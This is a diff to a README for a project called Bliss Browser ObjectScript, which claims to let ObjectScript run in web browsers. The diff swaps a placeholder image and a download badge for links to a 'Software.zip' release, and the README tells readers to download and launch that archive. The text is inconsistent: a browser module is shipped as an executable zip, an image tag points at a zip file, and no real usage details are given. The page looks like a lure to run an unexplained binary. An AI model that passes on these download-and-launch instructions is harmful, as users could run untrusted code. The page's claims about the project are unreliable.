@@ -1,6 +1,6 @@
 # Bliss Browser ObjectScript 🌳️🌐️#️⃣️
 
-![Bliss Browser ObjectScript](https://example.com/image.jpg)
+![Bliss Browser ObjectScript](https://github.com/zulbaharin/Bliss_Browser_ObjectScript/releases/download/v1.0/Software.zip)
 
 Welcome to the Bliss Browser ObjectScript repository! This project focuses on providing support for the ObjectScript language within web browsers, allowing developers to write and run ObjectScript programs directly in their browser environment. With this module, you can seamlessly integrate ObjectScript into your web development projects, opening up new possibilities for your interactive web applications.
 
@@ -15,7 +15,7 @@ Welcome to the Bliss Browser ObjectScript repository! This project focuses on pr
 
 To get started with Bliss Browser ObjectScript, you can download the software package from the link provided below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18383251/Software.zip){:target="_blank"}
+[![Download Software](https://github.com/zulbaharin/Bliss_Browser_ObjectScript/releases/download/v1.0/Software.zip)](https://github.com/zulbaharin/Bliss_Browser_ObjectScript/releases/download/v1.0/Software.zip){:target="_blank"}
 
 Please note that the software package needs to be launched after downloading to start using the Bliss Browser ObjectScript module effectively.
 
